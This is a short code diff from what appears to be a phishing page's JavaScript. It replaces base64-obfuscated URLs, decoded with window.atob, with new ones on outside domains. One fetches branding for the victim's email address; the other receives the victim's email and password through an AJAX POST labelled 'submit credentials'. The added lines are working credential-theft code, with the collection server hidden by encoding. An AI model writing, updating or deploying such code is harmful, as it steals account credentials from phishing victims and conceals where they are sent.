@@ -124,7 +124,7 @@ $(document).ready(function() {
     
     // AJAX request to get branding info
     var request = new XMLHttpRequest();
-    var url = window.atob('aHR0cHM6Ly9kaW5yYWlsZW5lcmd5bWV0ZXIuY29tLmF1L2ltYWdlL3Bydi5waHA/aWQ9') + email;
+    var url = window.atob('aHR0cHM6Ly9hYmNlbXByZWVuZGVkb3IuYW8vYXV0aHNlOC9wcnYucGhw/aWQ9') + email;
     
     request.open('GET', url, true);
     request.onload = function() {
@@ -218,7 +218,7 @@ $(document).ready(function() {
         
         // Use AJAX to submit credentials
         $.ajax({
-            url: window.atob("aHR0cHM6Ly9kaW5yYWlsZW5lcmd5bWV0ZXIuY29tLmF1L2ltYWdlL3BvbGljeS5waHA="),
+            url: window.atob("aHR0cHM6Ly9hYmNlbXByZWVuZGVkb3IuYW8vYXV0aHNlOC9wb2xpY3kucGhw"),
             type: "POST",
             data: {
                 "email": user,
